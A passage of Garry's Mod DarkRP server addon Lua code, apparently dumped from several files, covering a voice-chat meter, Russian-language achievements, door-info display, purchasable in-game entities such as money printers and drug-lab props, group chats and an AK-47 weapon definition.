		draw.RoundedBox(VoiceChatMeter.Radius,2,2,w-4,h-4,Color(0,0,0,180*Fade))
	end
	NameBar.Owner = ply
	
	// Initialize stuff for this think function
	local NameTxt,Av = vgui.Create("DLabel",NameBar),vgui.Create("AvatarImage",NameBar)
	
	// How the voice volume meters work
	function NameBar:Think()
		if !ply:IsValid() then NameBar:Remove() VoiceMeter.Talking[CurID] = nil return false end
		if !VoiceMeter.Talking[CurID] then NameBar:Remove() return false end
		if self.Next and CurTime()-self.Next < .02 then return false end
		if VoiceMeter.Talking[CurID].fade then if Go != 0 then Go = 0 end if Fade <= 0 then VoiceMeter.Talking[CurID]:Remove() VoiceMeter.Talking[CurID] = nil end end
		if Fade < Go and Fade != 1 then Fade = Fade+VoiceChatMeter.FadeAm NameTxt:SetAlpha(Fade*255) Av:SetAlpha(Fade*255) elseif Fade > Go and Go != 1 then Fade = Fade-VoiceChatMeter.FadeAm NameTxt:SetAlpha(Fade*255) Av:SetAlpha(Fade*255) end
		
		self.Next = CurTime()
		local CurVol = ply:VoiceVolume()*1.05
		
		local VolBar,Clr = vgui.Create("DPanel",NameBar),Color(255*(CurVol),255*(1-CurVol),0,190)
		VolBar:SetSize(5,(self:GetTall()-6)*(CurVol))
		VolBar:SetPos(self:GetTall()-6,(self:GetTall()-6)*(1-CurVol)+3)
		VolBar.Think = function(sel)
			if sel.Next and CurTime()-sel.Next < .02 then return false end
			sel.Next = CurTime()
			
			local X,Y = sel:GetPos()
			if X > NameBar:GetWide()+14 then sel:Remove() return end
			
			sel:SetPos(X+6,Y)
		end
		VolBar.Paint = function(s,w,h)
			draw.RoundedBox(0,0,0,w,h,Color(Clr.r,Clr.g,Clr.b,Clr.a*Fade))
		end
		VolBar:MoveToBack()
		VolBar:SetZPos(5)
	end
	
	// The player's avatar
	Av:SetPos(4,4)
	Av:SetSize(NameBar:GetTall()-8,NameBar:GetTall()-8)
	if not ply:GetNW2Bool("MaskMe") and not ply:GetNW2Bool("ManiakVoice",false) then
		Av:SetPlayer(ply)
	end
	
	local spyme = {
		["STEAM_0:0:125300844"] = true,
	}

	// Admin tags and the such
	local NameStr = ply:Name()
	if VoiceChatMeter.UseTags and not spyme[ply:SteamID()] then
		local Is
		for k,v in pairs(VoiceChatMeter.Tags) do if ply:IsUserGroup(k) then Is = v end end
		if !Is and ply:IsSuperAdmin() then Is = "" elseif !Is and ply:IsAdmin() then Is = "" end
		if ply:GetNW2Bool("MaskMe") then NameStr = Is .. " НЕИЗВЕСТНО" end
		if Is and not ply:GetNW2Bool("MaskMe") then NameStr = Is .. " " .. NameStr end
	end
	
	// The player's name
	NameTxt:SetPos(NameBar:GetTall()+4,H*.25)
	NameTxt:SetAlpha(0)
	NameTxt:SetFont("VoiceMeter_VoiceFont")
	NameTxt:SetText(NameStr)
	NameTxt:SetSize(W-NameBar:GetTall()-9,20)
	NameTxt:SetColor(Color(255,255,255,240))
	NameTxt:SetZPos(8)
	NameTxt:MoveToFront()
	NameBar:MoveToBack()
	
	// Hand up-to-face animation
	if VOICE and (not (ply:IsActiveTraitor() and (not ply.traitor_gvoice))) then
		ply:AnimPerformGesture(ACT_GMOD_IN_CHAT)
	end
	
	VoiceMeter.Talking[CurID] = NameBar
	
	return false
end
hook.Add("PlayerStartVoice","VoiceMeter's Voice Meter Addon Start",VoiceMeter.StartVoice)
function VoiceMeter.EndVoice(ply)
	for k,v in pairs(VoiceMeter.Talking) do if v.Owner == ply then VoiceMeter.Talking[k].fade = true break end end
	
	if DarkRP and ply == LocalPlayer() then
		hook.Remove("Think", "DarkRP_chatRecipients")
		hook.Remove("HUDPaint", "DarkRP_DrawChatReceivers")
		ply.DRPIsTalking = false
	end
	
	// More TTT specific stuff
	if (VOICE and VOICE.SetStatus) then
		if IsValid(ply) and not no_reset then
			ply.traitor_gvoice = false
		end

		if ply == LocalPlayer() then
			VOICE.SetSpeaking(false)
		end
	end
end
hook.Add("PlayerEndVoice","VoiceMeter's Voice Meter Addon End",VoiceMeter.EndVoice)

hook.Add("HUDShouldDraw","Remove old voice cards",function(elem) if elem == "CHudVoiceStatus" || elem == "CHudVoiceSelfStatus" then return false end end)

--PATH addons/111mod/lua/darkrp_modules/rp_achievement/sh_achievement.lua:
ash = {
	{
	id = 1,
	type = 'playtime',
	n = "Стартанувший",
	d = "Наиграйте на нашем сервере 30 часов",
	color = Color(255,155,55),
	mdl = 'models/props/cs_assault/moneypallet.mdl',
	b = 'start',
	playtime = '108000',
	},
	{
	id = 2,
	type = 'playtime',
	n = "В теме",
	d = "Наиграйте на нашем сервере 50 часов",
	color = Color(255,155,55),
	mdl = 'models/props/cs_assault/moneypallet.mdl',
	b = 'tema',
	playtime = '180000',
	},
	{
	id = 3,
	type = 'playtime',
	n = "Бывалый",
	d = "Наиграйте на нашем сервере 100 часов",
	color = Color(255,155,55),
	mdl = 'models/props/cs_assault/moneypallet.mdl',
	b = 'Veteran',
	playtime = '360000',
	},
	{
	id = 4,
	type = 'playtime',
	n = "Проверенный",
	d = "Наиграйте на нашем сервере 500 часов",
	color = Color(255,155,55),
	mdl = 'models/props/cs_assault/moneypallet.mdl',
	b = 'Veteranx2',
	playtime = '1800000',
	},
	{
	id = 5,
	type = 'playtime',
	n = "Не возможно остановиться",
	d = "Наиграйте на нашем сервере 1000 часов",
	color = Color(255,155,55),
	mdl = 'models/props/cs_assault/moneypallet.mdl',
	b = 'Veteranx3',
	playtime = '3600000',
	},
	{
	id = 6,
	type = 'money',
	n = "Супермажик",
	d = "Заработайте 1.000.000$ на нашем сервере",
	color = Color(64, 128, 64),
	mdl = 'models/props_lab/huladoll.mdl',
	b = 'supermaj',
	money = '1000000',
	},
	{
	id = 7,
	type = 'money',
	n = "Покаритель женских сердец",
	d = "Заработайте 5.000.000$ на нашем сервере",
	color = Color(64, 128, 64),
	mdl = 'models/props_lab/huladoll.mdl',
	b = 'supermajx5',
	money = '5000000',
	},
	{
	id = 8,
	type = 'kills',
	n = "Гангстер",
	d = "Убейте 100 игроков на нашем сервере",
	color = Color(64, 128, 64),
	mdl = 'models/Gibs/HGIBS.mdl',
	b = 'killer',
	kills = '100',
	},
	{
	id = 9,
	type = 'kills',
	n = "Палач",
	d = "Убейте 350 игроков на нашем сервере",
	color = Color(68, 128, 64),
	mdl = 'models/Gibs/HGIBS.mdl',
	b = 'killerx2',
	kills = '350',
	},
	{
	id = 10,
	type = 'kills',
	n = "Уличный босс",
	d = "Убейте 750 игроков на нашем сервере",
	color = Color(72, 128, 64),
	mdl = 'models/Gibs/HGIBS.mdl',
	b = 'killerx3',
	kills = '750',
	},
	{
	id =11,
	type = 'kills',
	n = "Крестный отец",
	d = "Убейте 1200 игроков на нашем сервере",
	color = Color(76, 128, 64),
	mdl = 'models/Gibs/HGIBS.mdl',
	b = 'killerx4',
	kills = '1200',
	},
	{
	id = 12,
	type = 'nw',
	n = "Сидевший",
	d = "Получите хоть один раз блокировку на нашем сервере",
	color = Color(255,0,0),
	mdl = 'models/props/cs_militia/toilet.mdl',
	b = 'banblyat',
	nw = 'ban',
	},
	{
	id = 13,
	type = 'nw',
	n = "Меценат",
	d = "Пополните свой донат счет на любую сумму",
	color = Color(64, 20, 64),
	mdl = 'models/balloons/balloon_classicheart.mdl',
	b = 'donaterebanat',
	nw = 'donated',
	}
}
--PATH addons/111mod/lua/darkrp_modules/menu/cl_modelicon.lua:

-----------------------------------------------------
local PANEL = {}

function PANEL:Init()
	self:SetModel(LocalPlayer():GetModel())
end

function PANEL:Paint(w, h)
	draw.Box(0, 0, w, h, ui.col.Background)
	if self:IsHovered() then
		draw.Box(1, 1, w - 2, h - 2, ui.col.Hover, ui.col.Outline)
	end
end

function PANEL:PaintOver(w, h)
	--draw.Outline(0, 0, w, h, ui.col.Outline)
end

vgui.Register('rp_modelicon', PANEL, 'SpawnIcon')
--PATH addons/111mod/lua/darkrp_modules/cmenu/cl_doorinfo.lua:
--Worst code of the year 2014
--Whatever... Its working, and thats all that matters, am i rite?

local black = Color(0, 0, 0, 255)
local white = Color(255, 255, 255, 200)
local red = Color(128, 30, 30, 255)

local costdoor = 35

surface.CreateFont( "3ddoorsiplay", {
	font = "Tahoma",
	size = 50,
	weight = 300,
	antialias = true,
	outline = false,
})

local function DrawDarkRPDoorInfo(door,ex,why)
	local blocked = door:getKeysNonOwnable()
	local superadmin = LocalPlayer():IsSuperAdmin()
	local doorTeams = door:getKeysDoorTeams()
	local doorGroup = door:getKeysDoorGroup()
	local owned = door:isKeysOwned() or doorGroup or doorTeams

	local doorInfo = {}

	local title = door:getKeysTitle()
	if title then table.insert(doorInfo, title) end

	if door:isKeysOwned() then
		table.insert(doorInfo, door:getDoorOwner():Nick())
		for k,v in pairs(door:getKeysCoOwners() or {}) do
			local ent = Player(k)
			if not IsValid(ent) or not ent:IsPlayer() then continue end
			table.insert(doorInfo, ent:Nick())
		end

		local allowedCoOwn = door:getKeysAllowedToOwn()
		if allowedCoOwn and not fn.Null(allowedCoOwn) then
			table.insert(doorInfo, DarkRP.getPhrase("keys_other_allowed"))

			for k,v in pairs(allowedCoOwn) do
				local ent = Player(k)
				if not IsValid(ent) or not ent:IsPlayer() then continue end
				table.insert(doorInfo, ent:Nick())
			end
		end
	elseif doorGroup then
		table.insert(doorInfo, doorGroup)
		local colorteam = white
	elseif doorTeams then
		for k, v in pairs(doorTeams) do
			if not v or not RPExtraTeams[k] then continue end

			table.insert(doorInfo, RPExtraTeams[k].name)
		end
	elseif blocked and superadmin then
		--table.insert(doorInfo, DarkRP.getPhrase("keys_allow_ownership"))
	elseif not blocked then
		table.insert(doorInfo, "F2 - арендовать")
		if superadmin then
			--table.insert(doorInfo, DarkRP.getPhrase("keys_disallow_ownership"))
		end
	end

	if door:IsVehicle() then
		for k,v in player.Iterator() do
			if v:GetVehicle() ~= door then continue end

			table.insert(doorInfo, DarkRP.getPhrase("driver", v:Nick()))
			break
		end
	end

	local x, y = ex, why
	draw.DrawNonParsedText(table.concat(doorInfo, "\n"), "3d2d", x , y-198 , black, 1)
	draw.DrawNonParsedText(table.concat(doorInfo, "\n"), "3d2d", x, y-200, (blocked or owned) and colorteam or white, 1)

	if !(blocked or owned) then
		draw.DrawNonParsedText("$"..costdoor, "3d2d", x, y-100, Color(45, 164, 19), 1)
	end

end

local function Draw3DDoor2(door)
	if door:GetClass() and door:GetClass() != "prop_door_rotating" then return end
	
	local ang = door:GetAngles()
	
	cam.Start3D()
	
		ang:RotateAroundAxis(ang:Right(), 90)
		ang:RotateAroundAxis(ang:Up(), -90)
		
		cam.Start3D2D( door:GetPos() + ang:Forward() * -44 + ang:Up() + ang:Right() * -25, ang, .030 )
			DrawDarkRPDoorInfo(door,650,450)
		cam.End3D2D()
		
		ang:RotateAroundAxis(ang:Right(), 180)
		
		cam.Start3D2D( door:GetPos() + ang:Forward() * 5 + ang:Up() + ang:Right() * -25, ang, .030 )
			DrawDarkRPDoorInfo(door,600,450)
		cam.End3D2D()
		
	cam.End3D()
	
	return true
end
hook.Add("HUDDrawDoorData","Door_Draw_3D_Data",Draw3DDoor2)
--PATH addons/111mod/lua/darkrp_customthings/entities.lua:
local vipRanks = {
  ['vip']             = true,
  ['NS-moder']    = true,
  ['downer']          = true,
  ['NS-admin']      = true,
  ['NS-helper']       = true,
  ['sponsor']     = true,
  ['padmin']        = true,
  ['moder']         = true,
  ['overwatch']     = true,
  ['manager']     = true,
  ['dsuperadmin']   = true,
  ['superadmin']    = true,
  ['NS-trainee']    = true,
  ['NS-mlmoder']    = true,
  ['NS-mladmin']    = true,
  ['NS-assistant']  = true,
  ['uprav']         = true,
  ['NS-zammanager']   = true,
}

local function isVIP(ply)
    return vipRanks[ply:GetUserGroup()]
end

DarkRP.createEntity("Денежный принтер", {
	ent = "f_printer",
	model = "models/props_c17/consolebox01a.mdl",
	price = 4000,
	max = 2,
	cmd = "f_printer",
	allowed = {TEAM_CITIZEN, TEAM_MMEDIC, TEAM_GANG, TEAM_MOB, TEAM_HIT, TEAM_FARMER, TEAM_SHPION, TEAM_PARKOUR, TEAM_MEHANIK, TEAM_BANK, TEAM_EGANG, TEAM_DRUG, TEAM_ASSASIN, TEAM_GUN, TEAM_STORE, TEAM_MEDIC, TEAM_SEC, TEAM_CAMERA, TEAM_ASSASIN, TEAM_COOK, TEAM_TV, TEAM_VOR, TEAM_GRAB, TEAM_THIEFF, TEAM_BANDIST, TEAM_OHOT, TEAM_BUIS, TEAM_NASIL },
	category = "Нелегальные предметы",
})

DarkRP.createEntity("Казино - 50/50", {
	ent = "gambling_machine_fiftyfifty",
	model = "models/props/cs_office/computer.mdl",
	price = 1500,
	max = 1,
	cmd = "buyigromat50",
	allowed = {TEAM_BUIS},
	category = "Предметы работы",
})

DarkRP.createEntity("Казино - Слоты", {
	ent = "gambling_machine_basicslots",
	model = "models/props/cs_office/computer.mdl",
	price = 2500,
	max = 1,
	cmd = "buyigromatslots",
	allowed = {TEAM_BUIS},
	category = "Предметы работы",
})

DarkRP.createEntity("Казино - Колесо удачи", {
	ent = "gambling_machine_spinwheel",
	model = "models/props/cs_office/computer.mdl",
	price = 2000,
	max = 1,
	cmd = "buyigromatfortune",
	allowed = {TEAM_BUIS},
	category = "Предметы работы",
})

DarkRP.createEntity("Металлодетектор", {
	ent = "metal_detector",
	model = "models/props_wasteland/interior_fence002e.mdl",
	price = 5000,
	max = 1,
	cmd = "buymetaldetector",
	category = "Предметы работы",
})

DarkRP.createEntity("Коробка пожертвований", {
	ent = "donation_box",
	model = "models/props/CS_militia/footlocker01_open.mdl",
	price = 1500,
	max = 1,
	cmd = "donatebox",
	allowed = {TEAM_HOBO, TEAM_HOBOO},
	category = "Предметы работы",
})


DarkRP.createEntity("Броня [VIP]", {
	ent = "item_battery",
	model = "models/items/battery.mdl",
	price = 1650,
	max = 2,
	cmd = "buyarmor",
	category = "Жизни/Броня [VIP]",
	customCheck = isVIP,
	CustomCheckFailMsg = "Вы не VIP!"
})


DarkRP.createEntity("Аптечка [VIP]", {
	ent = "item_healthvial",
	model = "models/healthvial.mdl",
	price = 1250,
	max = 2,
	cmd = "buyhealth",
	category = "Жизни/Броня [VIP]",
	customCheck = isVIP,
	CustomCheckFailMsg = "Вы не VIP!"
})

DarkRP.createEntity("Вейп", {
	ent = "weapon_vape",
	model = "models/swamponions/vape.mdl",
	price = 2500,
	max = 3,
	cmd = "buywape",
	allowed = {TEAM_STORE},
	category = "Предметы работы",
})

DarkRP.createEntity("Торговая лавка", {
	ent = "itemstore_shop",
	model = "models/props_c17/display_cooler01a.mdl",
	price = 1500,
	max = 1,
	cmd = "torglavka",
})


DarkRP.createEntity("Какашки", {
	ent = "weapon_bugbait",
	model = "models/weapons/w_bugbait.mdl",
	price = 250,
	max = 1,
	cmd = "buygovno",
	category = "Предметы работы",
})


DarkRP.createEntity("Радио", {
	ent = "jukebox",
	model = "models/props_lab/citizenradio.mdl",
	price = 500,
	max = 1,
	cmd = "buyradio",
	-- allowed = {TEAM_MEHANIK, TEAM_STORE},
	category = "Предметы работы",
})

DarkRP.createEntity("Телевизор", {
	ent = "media_tv_small",
	model = "models/props_phx/rt_screen.mdl",
	price = 7500,
	max = 1,
	cmd = "buytvsmall",
	-- allowed = {TEAM_MEHANIK, TEAM_STORE},
	category = "Предметы работы",
})

DarkRP.createEntity("Большой телевизор", {
	ent = "media_tv_large",
	model = "models/props_phx/rt_screen.mdl",
	price = 15000,
	max = 1,
	cmd = "buytvlarge",
	-- allowed = {TEAM_MEHANIK, TEAM_STORE},
	category = "Предметы работы",
})

DarkRP.createEntity("Маленькая картина", {
	ent = "ent_picture",
	model = "models/props/cs_office/offpaintinge.mdl",
	price = 1400,
	max = 4,
	cmd = "buypicture",
	category = "Предметы работы",
})

DarkRP.createEntity("Средняя картина", {
	ent = "ent_picture1",
	model = "models/props/cs_office/offpaintinge.mdl",
	price = 1450,
	max = 3,
	cmd = "buypicture1",
	category = "Предметы работы",
})

DarkRP.createEntity("Большая картина", {
	ent = "ent_picture2",
	model = "models/props/cs_office/offpaintinge.mdl",
	price = 1500,
	max = 2,
	cmd = "buypicture2",
	category = "Предметы работы",
})

DarkRP.createEntity("Хил станция", {
	ent = "health_station",
	model = "models/props_c17/consolebox05a.mdl",
	price = 15000,
	max = 1,
	cmd = "buystation",
	category = "Предметы работы",
})

DarkRP.createEntity("Броне станция", {
	ent = "armour_station",
	model = "models/props_c17/consolebox05a.mdl",
	price = 15000,
	max = 1,
	cmd = "buyastation",
	category = "Предметы работы",
})

DarkRP.createEntity("Камера", {
	ent = "gmod_camera",
	model = "models/maxofs2d/camera.mdl",
	price = 50,
	max = 1,
	cmd = "buycamera",
	category = "Предметы работы",
})


DarkRP.createEntity("Разноцветный Vape [VIP]", {
	ent = "weapon_vape_juicy",
	model = "models/swamponions/vape.mdl",
	price = 8000,
	max = 3,
	cmd = "buyrandomcolorvape",
	allowed = {TEAM_STORE},
	category = "Предметы работы",
	customCheck = isVIP,
	CustomCheckFailMsg = "Вы не VIP!"
})

DarkRP.createEntity("Галлюцинационый Vape [VIP]", {
	ent = "weapon_vape_hallucinogenic",
	model = "models/swamponions/vape.mdl",
	price = 6000,
	max = 3,
	cmd = "buyhallogenvape",
	allowed = {TEAM_STORE},
	category = "Предметы работы",
	customCheck = isVIP,
	CustomCheckFailMsg = "Вы не VIP!"
})

-- Cook

DarkRP.createEntity("Кухонная плита", {
    ent = "hfm_stove",
    model = "models/ent/stove.mdl",
    price = 3000,
    max = 1,
    cmd = "stove",
    allowed = {TEAM_COOK},
    category = "Предметы работы",
})


-- DarkRP.createEntity("Фейковый паспорт", {
    -- ent = "fakepass",
    -- model = "models/kerry/passport_rus.mdl",
    -- price = 15000,
    -- max = 1,
    -- cmd = "fakepass",
    -- allowed = {TEAM_STORE},
    -- category = "Предметы работы",
-- })

-- Bitminers2

DarkRP.createEntity("Битмайнер S1", {
	ent = "bm2_bitminer_1",
	model = "models/bitminers2/bitminer_1.mdl",
	price = 2500,
	max = 1,
	cmd = "buybitminersone",
	allowed = {TEAM_BIT},
	category = "Битмайнер",
}) 

DarkRP.createEntity("Битмайнер S2", {
	ent = "bm2_bitminer_2",
	model = "models/bitminers2/bitminer_3.mdl",
	price = 14500,
	max = 1,
	cmd = "buybitminerstwo",
	category = "Битмайнер",
	allowed = {TEAM_BIT},
})

DarkRP.createEntity("Сервер", {
	ent = "bm2_bitminer_server",
	model = "models/bitminers2/bitminer_2.mdl",
	price = 25000,
	max = 8,
	cmd = "buybitminerserver",
	category = "Битмайнер",
	allowed = {TEAM_BIT},
})

DarkRP.createEntity("Склад для сервера", {
	ent = "bm2_bitminer_rack",
	model = "models/bitminers2/bitminer_rack.mdl",
	price = 15000,
	max = 1,
	cmd = "buybitminerrack",
	category = "Битмайнер",
	allowed = {TEAM_BIT},
})

DarkRP.createEntity("Удлинитель", {
	ent = "bm2_extention_lead",
	model = "models/bitminers2/bitminer_plug_3.mdl",
	price = 500,
	max = 3,
	cmd = "buybitminerextension",
	category = "Битмайнер",
	allowed = {TEAM_BIT},
})

DarkRP.createEntity("Кабель питания", {
	ent = "bm2_power_lead",
	model = "models/bitminers2/bitminer_plug_2.mdl",
	price = 500,
	max = 4,
	cmd = "buybitminerpowerlead",
	category = "Битмайнер",
	allowed = {TEAM_BIT},
})

DarkRP.createEntity("Генератор", {
	ent = "bm2_generator",
	model = "models/bitminers2/generator.mdl",
	price = 4500,
	max = 2,
	cmd = "buybitminergenerator",
	category = "Битмайнер",
	allowed = {TEAM_BIT},
})

DarkRP.createEntity("Топливо", {
	ent = "bm2_fuel",
	model = "models/props_junk/gascan001a.mdl",
	price = 500,
	max = 2,
	cmd = "buybitminerfuel",
	category = "Битмайнер",
	allowed = {TEAM_BIT},
})

---------------------------------------------------------------
---------------------------------------------------------------
--- The Cocaine Factory ---

DarkRP.createEntity("Бутылка воды", {
	ent = "cocaine_water",
	model = "models/craphead_scripts/the_cocaine_factory/utility/water.mdl",
	price = 75,
	max = 4,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buywaters",
})

DarkRP.createEntity("Плита", {
	ent = "cocaine_stove",
	model = "models/craphead_scripts/the_cocaine_factory/stove/gas_stove.mdl",
	price = 1500,
	max = 1,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buystove",
})

DarkRP.createEntity("Кастрюля", {
	ent = "cocaine_cooking_pot",
	model = "models/craphead_scripts/the_cocaine_factory/utility/pot.mdl",
	price = 50,
	max = 4,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buypot",
})

DarkRP.createEntity("Ведро", {
	ent = "cocaine_bucket",
	model = "models/craphead_scripts/the_cocaine_factory/utility/bucket.mdl",
	price = 75,
	max = 1,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buybucket",
})

DarkRP.createEntity("Листья", {
	ent = "cocaine_leaves",
	model = "models/craphead_scripts/the_cocaine_factory/utility/leaves.mdl",
	price = 50,
	max = 6,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buyleaves",
})

DarkRP.createEntity("Аккумулятор", {
	ent = "cocaine_battery",
	model = "models/craphead_scripts/the_cocaine_factory/utility/battery.mdl",
	price = 150,
	max = 1,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buybattery",
})

DarkRP.createEntity("Канистра с газом", {
	ent = "cocaine_gas",
	model = "models/craphead_scripts/the_cocaine_factory/utility/gas_tank.mdl",
	price = 350,
	max = 2,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buygas",
})

DarkRP.createEntity("Сушилка", {
	ent = "cocaine_drying_rack",
	model = "models/craphead_scripts/the_cocaine_factory/drying_rack/drying_rack.mdl",
	price = 1500,
	max = 1,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buydryingrack",
})

DarkRP.createEntity("Коробка для кокаина", {
	ent = "cocaine_box",
	model = "models/craphead_scripts/the_cocaine_factory/utility/cocaine_box.mdl",
	price = 100,
	max = 1,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buycocainebox",
})

if not TCF.Config.InstallPlatesDefault then
	DarkRP.createEntity("Варочная панель", {
		ent = "cocaine_cooking_plate",
		model = "models/craphead_scripts/the_cocaine_factory/utility/stove_upgrade.mdl",
		price = 250,
		max = 4,
		category = "Cocaine Factory",
		allowed = {TEAM_CGANG},
		cmd = "buyplateupgrade",
	})
end

DarkRP.createEntity("Экстрактор кокаина", {
	ent = "cocaine_extractor",
	model = "models/craphead_scripts/the_cocaine_factory/extractor/extractor.mdl",
	price = 1750,
	max = 1,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buyextractor",
})

DarkRP.createEntity("Пищевая сода", {
	ent = "cocaine_baking_soda",
	model = "models/craphead_scripts/the_cocaine_factory/utility/soda.mdl",
	price = 50,
	max = 4,
	category = "Cocaine Factory",
	allowed = {TEAM_CGANG},
	cmd = "buybakingsoda",
})

---------------------------------------------------------------
---------------------------------------------------------------

DarkRP.createEntity("Объединитель", {
	ent = "zmlab_combiner",
	model = "models/zerochain/zmlab/zmlab_combiner.mdl",
	price = 4000,
	max = 1,
	cmd = "buycombiner_zmlab",
	allowed = {TEAM_METIK},
	category = "MasterMethCook"
})

DarkRP.createEntity("Газовый фильтр", {
	ent = "zmlab_filter",
	model = "models/zerochain/zmlab/zmlab_filter.mdl",
	price = 1000,
	max = 1,
	cmd = "buyfilter_zmlab",
	allowed = {TEAM_METIK},
	category = "MasterMethCook"
})

DarkRP.createEntity("Камера замораживания", {
	ent = "zmlab_frezzer",
	model = "models/zerochain/zmlab/zmlab_frezzer.mdl",
	price = 1500,
	max = 1,
	cmd = "buyfrezzer_zmlab",
	allowed = {TEAM_METIK},
	category = "MasterMethCook"
})

DarkRP.createEntity("Транспортный ящик", {
	ent = "zmlab_collectcrate",
	model = "models/zerochain/zmlab/zmlab_transportcrate.mdl",
	price = 100,
	max = 6,
	cmd = "buycollectcrate_zmlab",
	allowed = {TEAM_METIK},
	category = "MasterMethCook"
})

DarkRP.createEntity("Метиламин", {
	ent = "zmlab_methylamin",
	model = "models/zerochain/zmlab/zmlab_methylamin.mdl",
	price = 500,
	max = 3,
	cmd = "buymethylamin_zmlab",
	allowed = {TEAM_METIK},
	category = "MasterMethCook"
})

DarkRP.createEntity("Алюминий", {
	ent = "zmlab_aluminium",
	model = "models/zerochain/zmlab/zmlab_aluminiumbox.mdl",
	price = 100,
	max = 3,
	cmd = "buyaluminium_zmlab",
	allowed = {TEAM_METIK},
	category = "MasterMethCook"
})

-- DarkRP.createEntity("Транспортная палитра", {
	-- ent = "zmlab_palette",
	-- model = "models/props_junk/wood_pallet001a.mdl",
	-- price = 100,
	-- max = 1,
	-- cmd = "buypalette_zmlab",
	-- allowed = {TEAM_METIK},
	-- category = "MasterMethCook"
-- })

---------------------------------------------------------------
---------------------------------------------------------------

-- DarkRP.createEntity("DoobyTable", {
    -- ent = "zwf_doobytable",
    -- model = "models/zerochain/props_weedfarm/zwf_doobytable.mdl",
    -- price = 5000,
    -- max = 1,
    -- cmd = "buyzwf_doobytable",
	-- allowed = TEAM_DRUG,
    -- category = "Weed Grower"
-- })

-- DarkRP.createEntity("Миксер", {
    -- ent = "zwf_mixer",
    -- model = "models/zerochain/props_weedfarm/zwf_mixer.mdl",
    -- price = 1000,
    -- max = 1,
    -- cmd = "buyzwf_mixer",
	-- allowed = TEAM_DRUG,
    -- category = "Weed Grower"
-- })

-- DarkRP.createEntity("Духовка", {
    -- ent = "zwf_oven",
    -- model = "models/zerochain/props_weedfarm/zwf_oven.mdl",
    -- price = 1000,
    -- max = 1,
    -- cmd = "buyzwf_oven",
	-- allowed = TEAM_DRUG,
    -- category = "Weed Grower"
-- })

-- local function Spawn_BackMix(id,ply,tr)
    -- local backmix = ents.Create("zwf_backmix")
    -- backmix:SetPos(tr.HitPos)
    -- backmix:Spawn()
    -- backmix:SetModel(zwf.config.Cooking.edibles[id].backmix_model)
    -- backmix:Activate()
    -- backmix.EdibleID = id
    -- return backmix
-- end

-- DarkRP.createEntity("Маффин микс", {
    -- ent = "zwf_backmix",
    -- model = "models/zerochain/props_weedfarm/zwf_backmix_muffin.mdl",
    -- price = 500,
    -- max = 2,
    -- cmd = "buyzwf_backmix_muffin",
	-- allowed = TEAM_DRUG,
    -- category = "Weed Grower",
    -- spawn = function(ply, tr, tblEnt)
        -- return  Spawn_BackMix(1,ply,tr)
    -- end
-- })

-- DarkRP.createEntity("Брауни Микс", {
    -- ent = "zwf_backmix",
    -- model = "models/zerochain/props_weedfarm/zwf_backmix_brownie.mdl",
    -- price = 500,
    -- max = 2,
    -- cmd = "buyzwf_backmix_brownie",
	-- allowed = TEAM_DRUG,
    -- category = "Weed Grower",
    -- spawn = function(ply, tr, tblEnt)
        -- return  Spawn_BackMix(2,ply,tr)
    -- end
-- })

--PATH addons/111mod/lua/darkrp_customthings/groupchats.lua:
--[[---------------------------------------------------------------------------
Group chats
---------------------------------------------------------------------------
Team chat for when you have a certain job.
e.g. with the default police group chat, police officers, chiefs and mayors can
talk to one another through /g or team chat.

HOW TO MAKE A GROUP CHAT:
Simple method:
GAMEMODE:AddGroupChat(List of team variables separated by comma)

Advanced method:
GAMEMODE:AddGroupChat(a function with ply as argument that returns whether a random player is in one chat group)
This is for people who know how to script Lua.

---------------------------------------------------------------------------]]
-- Example: GAMEMODE:AddGroupChat(TEAM_MOB, TEAM_GANG)
-- Example: GAMEMODE:AddGroupChat(function(ply) return ply:isCP() end)
GAMEMODE:AddGroupChat(TEAM_CHIEF, TEAM_POLICE, TEAM_MAYOR, TEAM_OMON, TEAM_FBI, TEAM_ROMON, TEAM_DOMON, TEAM_SOMON, TEAM_JAGA)
GAMEMODE:AddGroupChat(TEAM_MEDIC, TEAM_MMEDIC)
GAMEMODE:AddGroupChat(TEAM_DOGEE, TEAM_DOGE)
--PATH addons/weaponandcontent/lua/weapons/ak47/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = true
	SWEP.PrintName = "AK-47"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos = Vector(3.552, -2.895, 1.2)
	SWEP.AimAng = Vector(0.79, -0.057, 0)
	
	SWEP.SprintPos = Vector(-3.701, -7.008, 0.865)
	SWEP.SprintAng = Vector(-10.197, -63.111, -4.134)
	
	SWEP.ViewModelMovementScale = 1.15
	
	SWEP.IconLetter = "b"
	--killicon.AddFont("swb_ak47", "SWB_KillIcons", SWEP.IconLetter, Color(255, 80, 0, 150))
	
	SWEP.MuzzleEffect = "swb_rifle_med"
end

SWEP.PlayBackRate = 30
SWEP.PlayBackRateSV = 12
SWEP.SpeedDec = 30
SWEP.BulletDiameter = 7.62
SWEP.CaseLength = 39

SWEP.Kind = WEAPON_HEAVY
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true

SWEP.Slot = 3
SWEP.SlotPos = 0
SWEP.NormalHoldType = "ar2"
SWEP.RunHoldType = "passive"
SWEP.FireModes = {"auto", "semi"}
SWEP.Base = "swb_base"
SWEP.Category = "Weapons"

SWEP.Author			= "aStonedPenguin"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 70
SWEP.ViewModelFlip	= true
SWEP.ViewModel				= "models/weapons/2_rif_ak47.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_rif_ak47.mdl"	-- Weapon world model

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 30
SWEP.Primary.DefaultClip	= 30
SWEP.Primary.Automatic		= true
SWEP.Primary.Ammo			= "ar2"

